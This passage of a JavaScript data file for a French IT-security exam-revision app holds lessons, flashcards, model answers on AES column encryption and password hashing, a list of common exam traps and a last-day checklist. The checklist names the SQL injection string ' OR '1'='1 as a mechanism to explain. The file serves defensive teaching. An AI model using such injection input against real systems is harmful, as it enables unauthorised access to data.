    { id: "cr1", q: "Hachage, chiffrement symétrique, asymétrique : quelle différence ?", a: "Hachage : irréversible, pour vérifier. Symétrique : réversible avec la même clé (AES), pour protéger au repos. Asymétrique : paire de clés, pour l'échange de clés et la signature (TLS)." },
    { id: "cr2", q: "Pourquoi une colonne VARBINARY pour AES_ENCRYPT ?", a: "La sortie d'<code>AES_ENCRYPT</code> est binaire. La stocker dans un <code>VARCHAR</code> provoque des conversions de jeu de caractères qui corrompent les données." },
    { id: "cr3", q: "Où doit vivre la clé de chiffrement ?", a: "Dans la configuration ou un coffre-fort de secrets, jamais en dur dans le code ni dans la requête SQL, sinon elle fuit par les logs et le dépôt Git." },
    { id: "cr4", q: "Que protège TLS, et que ne protège-t-il pas ?", a: "Il protège le contenu en transit (confidentialité, intégrité, authentification du serveur). Il ne protège pas les données stockées côté serveur, ni les métadonnées comme l'IP ou le domaine visité." },
    { id: "cr5", q: "Conséquence de chiffrer une colonne sur les recherches ?", a: "Un <code>WHERE</code> ou un <code>LIKE</code> direct devient impossible, car le chiffrement n'est pas déterministe. Il faut un index aveugle ou déchiffrer côté application. C'est un compromis à citer." }
  ],
  ateliers: [
    {
      id: "at-aes",
      title: "Chiffre et relis une donnée sensible",
      lang: "sql",
      prompt: `<p>La table <code>contrat(id, num_secu VARBINARY(255))</code> doit stocker un numéro de sécurité sociale chiffré.</p>
      <p>Écris l'insertion chiffrée, puis la requête qui relit la valeur en clair pour le contrat 12. La clé vient d'une variable, pas en dur.</p>`,
      starter: `INSERT INTO contrat `,
      model: `-- La cle vient de la configuration applicative, pas du code source
SET @cle = 'cle_secrete_de_32_caracteres';

INSERT INTO contrat (id, num_secu)
VALUES (12, AES_ENCRYPT('185127512345678', @cle));

-- Relecture en clair
SELECT CAST(AES_DECRYPT(num_secu, @cle) AS CHAR) AS num_secu_clair
FROM contrat
WHERE id = 12;`,
      checks: [
        { label: "AES_ENCRYPT à l'insertion", test: /AES_ENCRYPT\s*\(/i },
        { label: "AES_DECRYPT à la lecture", test: /AES_DECRYPT\s*\(/i },
        { label: "CAST en CHAR pour relire du texte", test: /CAST\s*\(\s*AES_DECRYPT[\s\S]*AS\s+CHAR/i },
        { label: "Clé sortie du code (variable ou configuration)", test: /SET\s+@cle|:\s*cle|\$ENV|getenv/i },
        { label: "Filtre sur l'id du contrat", test: /WHERE\s+id\s*=\s*12/i }
      ]
    }
  ]
},

/* ============================== 12 ============================== */
{
  id: "12-redaction",
  num: "13",
  title: "Comment rédiger pour marquer les points",
  tag: "Transversal",
  hot: false,
  intro: "Deux élèves qui savent la même chose n'obtiennent pas la même note. La différence se joue dans la forme de la réponse.",
  cours: `
  <h2>1. La règle des 3 points par question de 3 points</h2>
  <ul>
    <li>3 points : 3 idées distinctes, ou 1 idée + 1 justification + 1 exemple.</li>
    <li>2 points : le mot-clé + la justification.</li>
    <li>Donc une ligne par case, numérotée. Pas de paragraphe compact.</li>
  </ul>

  <h2>2. Verbes de consigne</h2>
  <table class="tbl">
    <caption>Ce qui est attendu, et l'erreur fatale</caption>
    <thead><tr><th>Verbe</th><th>Attendu</th><th>Erreur fatale</th></tr></thead>
    <tbody>
      <tr><td><strong>Identifier</strong></td><td>nommer précisément</td><td>décrire vaguement</td></tr>
      <tr><td><strong>Citer</strong></td><td>recopier l'élément du document</td><td>reformuler de mémoire</td></tr>
      <tr><td><strong>Justifier</strong></td><td>cause puis conséquence</td><td>réponse sans explication</td></tr>
      <tr><td><strong>Expliquer</strong></td><td>mécanisme en 2 ou 3 phrases</td><td>recopier la définition du cours</td></tr>
      <tr><td><strong>Proposer</strong></td><td>solution argumentée</td><td>une solution unique non justifiée</td></tr>
      <tr><td><strong>Écrire</strong></td><td>code syntaxiquement correct</td><td>pseudo-code</td></tr>
      <tr><td><strong>Compléter</strong></td><td>remplir les trous</td><td>réécrire toute la fonction</td></tr>
      <tr><td><strong>Analyser</strong></td><td>décomposer puis conclure</td><td>décrire sans conclure</td></tr>
    </tbody>
  </table>

  <h2>3. Formulations qui marquent</h2>
  <ul>
    <li>"Cela permet de..." : introduit la justification.</li>
    <li>"En effet, ..." : enchaîne la cause et la conséquence.</li>
    <li>"Cette mesure est <strong>préventive</strong> et protège contre X." : mesure + cible.</li>
    <li>"Donnée <strong>personnelle</strong> au sens de l'article 4 du RGPD, car elle permet d'identifier indirectement..." : qualification juridique.</li>
  </ul>

  <h2>4. Formulations qui ne marquent pas</h2>
  <ul>
    <li>"C'est mieux", "c'est plus sécurisé", "c'est recommandé" sans complément.</li>
    <li>"L'attaquant peut faire ce qu'il veut." Sois précis : quoi, comment, sur quoi.</li>
    <li>Recopier une définition de cours quand la question demande une application au cas.</li>
  </ul>

  <h2>5. Écrire du code lisible</h2>
  <ul>
    <li>Indentation constante, 4 espaces.</li>
    <li>Noms explicites : <code>$mdpSaisi</code>, pas <code>$x</code>.</li>
    <li><code>try</code> et <code>catch</code> avec <code>PDOException</code> si le sujet demande la gestion d'erreur.</li>
    <li>Ne jamais laisser un commentaire <code>...</code> d'un trou non rempli.</li>
    <li>Si la syntaxe exacte échappe, écris le code correct en pseudo-code commenté : les points de logique sont souvent comptés.</li>
  </ul>
  `,
  cards: [
    { id: "rd1", q: "Une question vaut 3 points. Combien de lignes écrire ?", a: "Trois lignes numérotées, une idée par ligne. C'est le format qui correspond au barème à cases." },
    { id: "rd2", q: "Donne trois formulations qui rapportent des points", a: "\"Cela permet de...\", \"Cette mesure est préventive et protège contre...\", \"Donnée personnelle au sens de l'article 4, car elle identifie indirectement...\"." },
    { id: "rd3", q: "Que ne faut-il jamais écrire ?", a: "\"C'est plus sécurisé\" sans dire quoi ni contre quoi. \"L'attaquant peut faire ce qu'il veut\" sans préciser. Une définition de cours quand une application au cas est demandée." },
    { id: "rd4", q: "Comment rattraper une syntaxe incertaine en code ?", a: "Écrire le code correct en pseudo-code commenté et expliquer la logique. Les points de raisonnement sont souvent comptés même si la syntaxe pèche." }
  ],
  ateliers: [
    {
      id: "at-redaction-reponse",
      title: "Réécris une réponse bâclée",
      lang: "text",
      prompt: `<p>Réponse d'élève, 1 point sur 3 : "Il faut chiffrer les mots de passe et c'est plus sécurisé. Aussi il faut un pare-feu."</p>
      <p>Réécris-la en trois lignes numérotées qui couvrent les trois cases du barème.</p>`,
      starter: `1. `,
      model: `1. Il faut HACHER les mots de passe, pas les chiffrer : le hachage est
   irreversible, alors qu'un chiffrement est reversible et rend la cle
   de dechiffrement aussi sensible que les mots de passe eux-memes.

2. On utilise une fonction lente et parametrable comme bcrypt
   (password_hash avec PASSWORD_DEFAULT), jamais MD5 ou SHA1 qui sont
   trop rapides et casses par les rainbow tables.

3. Le pare-feu reseau ne protege pas de cette faille : il ne voit pas le
   contenu applicatif. La mesure pertinente contre le vol de mots de passe
   est le hachage robuste, complete par une politique de mot de passe et
   une limitation des tentatives.`,
      checks: []
    }
  ]
},

/* ============================== 13 ============================== */
{
  id: "13-pieges",
  num: "14",
  title: "Les 12 pièges récurrents",
  tag: "À connaître par cœur",
  hot: true,
  intro: "Ce sont les erreurs qui coûtent des points à chaque session. Si tu élimines ces douze-là, tu gagnes plusieurs points sans apprendre une notion de plus.",
  cours: `
  <h2>La liste</h2>
  <ol>
    <li>Confondre <strong>authentification</strong> et <strong>habilitation</strong>. "Vérifier qu'il a le droit d'accéder à SA facture" relève de l'habilitation.</li>
    <li>Proposer <code>addslashes</code> contre l'injection SQL. La réponse attendue est la <strong>requête préparée</strong>.</li>
    <li>Dire qu'un mot de passe doit être <strong>chiffré</strong>. Il doit être <strong>haché</strong>.</li>
    <li>Confondre donnée <strong>personnelle</strong> et <strong>sensible</strong>. Téléphone et email sont personnels, santé et origine ethnique sont sensibles.</li>
    <li>Répondre "72 h" pour tout. Les 72 h concernent la notification à la CNIL <strong>en cas de risque</strong>. L'information des personnes est une obligation distincte, si le risque est élevé.</li>
    <li>Oublier le <code>@hôte</code> d'un compte MySQL. <code>'user'@'localhost'</code> n'est pas <code>'user'@'%'</code>.</li>
    <li>Mettre la clé étrangère du côté 1 dans une association 1:N. Elle va toujours du côté <strong>N</strong>.</li>
    <li>Utiliser <code>WHERE</code> avec un agrégat. <code>HAVING</code> est obligatoire.</li>
    <li>Oublier le <code>WHERE</code> dans un <code>UPDATE</code> ou <code>DELETE</code> proposé, donc modifier toute la table.</li>
    <li>Dire que le pare-feu empêche l'injection SQL. Il ne voit pas le contenu applicatif. Seul un WAF pourrait filtrer, et ce n'est pas la correction.</li>
    <li>Répondre ce qu'affiche l'injection <strong>sans lire le code</strong>. Si le code teste seulement <code>num_rows &gt; 0</code>, l'affichage est "Connecté", pas la liste des comptes.</li>
    <li>Confondre 401 et 403. 401 : non authentifié. 403 : authentifié mais interdit.</li>
  </ol>
  <div class="callout callout--key">
    <span class="callout__label">Stratégie</span>
    <p>Avant de rendre, relis ta copie en cherchant uniquement ces douze motifs. C'est la relecture la plus rentable de l'épreuve.</p>
  </div>
  `,
  cards: [
    { id: "pg1", q: "Piège 1 : un utilisateur ne peut accéder qu'à ses factures. Authentification ou habilitation ?", a: "<strong>Habilitation</strong> (contrôle d'accès). L'authentification dit qui il est, pas ce qu'il a le droit de lire." },
    { id: "pg2", q: "Piège 2 : quelle est la mauvaise réponse à une injection SQL ?", a: "<code>addslashes()</code> ou <code>mysql_real_escape_string()</code>. La réponse attendue est la requête préparée avec <code>bindValue</code>." },
    { id: "pg3", q: "Piège 3 : chiffrer ou hacher un mot de passe ?", a: "<strong>Hacher.</strong> Un chiffrement est réversible, donc la clé devient le point faible. Le hachage ne permet pas de remonter au mot de passe." },
    { id: "pg4", q: "Piège 4 : le numéro de téléphone est-il une donnée sensible ?", a: "<strong>Non, personnelle.</strong> Les données sensibles sont limitées à la liste de l'article 9 : santé, origine ethnique, opinions politiques, religion, syndicat, orientation sexuelle, génétique, biométrie." },
    { id: "pg5", q: "Piège 5 : que signifie exactement le délai de 72 h ?", a: "Notification à la <strong>CNIL</strong>, et seulement si la violation est susceptible d'engendrer un <strong>risque</strong>. Si le risque est élevé, il faut <strong>en plus</strong> informer les personnes, sans délai imposé identique." },
    { id: "pg6", q: "Piège 6 : un compte MySQL existe, la connexion échoue depuis le serveur web. Pourquoi ?", a: "Le compte a probablement été créé pour <code>localhost</code>. L'hôte fait partie de l'identité du compte : il faut <code>'user'@'10.20.30.%'</code> pour un accès réseau." },
    { id: "pg7", q: "Piège 7 : dans un 1:N, où va la clé étrangère ?", a: "Du côté <strong>N</strong>, celui qui porte la cardinalité maximale plusieurs. C'est l'erreur la plus coûteuse en MCD vers MLD." },
    { id: "pg8", q: "Piège 8 : pourquoi <code>WHERE COUNT(*) &gt; 2</code> est faux ?", a: "<code>WHERE</code> s'exécute avant le regroupement, donc avant que <code>COUNT</code> existe. Il faut <code>HAVING COUNT(*) &gt; 2</code>." },
    { id: "pg9", q: "Piège 9 : quel est le risque d'un UPDATE sans WHERE ?", a: "Il modifie <strong>toutes les lignes</strong> de la table. Dans une question de sécurisation, c'est le risque à identifier explicitement." },
    { id: "pg10", q: "Piège 10 : le pare-feu bloque-t-il une injection SQL ?", a: "<strong>Non.</strong> Il filtre des flux réseau, pas le contenu applicatif. Un WAF peut aider, mais la correction reste la requête préparée." },
    { id: "pg11", q: "Piège 11 : le code fait <code>if ($res-&gt;num_rows &gt; 0) echo 'Connecté';</code>. Qu'affiche-t-il après injection ?", a: "Uniquement <strong>\"Connecté\"</strong>. Aucune donnée de la base n'est affichée. Répondre \"la liste des comptes\" sans lire le code fait perdre le point." },
    { id: "pg12", q: "Piège 12 : 401 ou 403 pour un utilisateur connecté qui accède à une ressource interdite ?", a: "<strong>403 Forbidden.</strong> 401 signifie qu'il n'est pas authentifié, ce qui n'est pas le cas ici." }
  ],
  ateliers: []
},

/* ============================== 14 ============================== */
{
  id: "14-checklist",
  num: "15",
  title: "Checklist J-1",
  tag: "Veille de l'épreuve",
  hot: false,
  intro: "Le 02/11 au soir, on ne découvre plus rien. On coche, on relit, on dort.",
  type: "checklist",
  cours: `
  <h2>Règle du dernier jour</h2>
  <p><strong>Ne pas apprendre de nouvelle notion après le 01/11.</strong> On consolide, on ne découvre plus. Une notion mal apprise la veille prend la place d'une notion solide.</p>
  <p>Coche ce que tu sais faire <em>sans hésiter</em>. Tout ce qui reste décoché est ton programme de la soirée, pas de la nuit.</p>
  `,
  cards: [],
  ateliers: [],
  checklist: [
    {
      title: "Savoir écrire sans hésiter",
      items: [
        "CREATE USER / GRANT / REVOKE / SHOW GRANTS",
        "prepare() + bindValue() + execute() en PDO",
        "password_hash() / password_verify() / password_needs_rehash()",
        "Jointure externe avec WHERE x.id IS NULL",
        "GROUP BY + HAVING, et l'ordre d'exécution SQL",
        "ALTER TABLE ... ADD COLUMN / ADD CONSTRAINT",
        "AES_ENCRYPT / AES_DECRYPT avec CAST en CHAR",
        "Une fonction PHP de validation de mot de passe, boucle et regex"
      ]
    },
    {
      title: "Savoir expliquer en deux phrases",
      items: [
        "Pourquoi MD5 est interdit pour les mots de passe",
        "Ce qu'est un sel et pourquoi il n'est pas secret",
        "Pourquoi une requête préparée protège",
        "La différence entre hachage et chiffrement",
        "Donnée personnelle contre donnée sensible",
        "Le principe de moindre privilège",
        "Les trois finalités de la journalisation",
        "Le mécanisme d'une injection SQL avec ' OR '1'='1",
        "Ce que montre une table de logs qui prouve une intrusion"
      ]
    },
    {
      title: "Savoir lister par cœur",
      items: [
        "Les 6 droits RGPD",
        "Les 3 familles de facteurs d'authentification",
        "Les 4 types de mesures : préventive, détective, corrective, dissuasive",
        "Les 10 catégories OWASP 2021",
        "Les codes HTTP 200, 201, 400, 401, 403, 404, 500",
        "Les 6 bases légales du RGPD"
      ]
    },
    {
      title: "Réflexes de salle",
      items: [
        "Lire le tableau de points avant tout",
        "Lire les annexes citées par les questions",
        "Numéroter chaque idée sur une ligne séparée",
        "Écrire quelque chose pour chaque question, jamais de vide",
        "Relire les questions « justifier » pour vérifier qu'il y a bien une justification",
        "Passer 10 minutes en relecture ciblée sur les 12 pièges"
      ]
    }
  ]
}

];
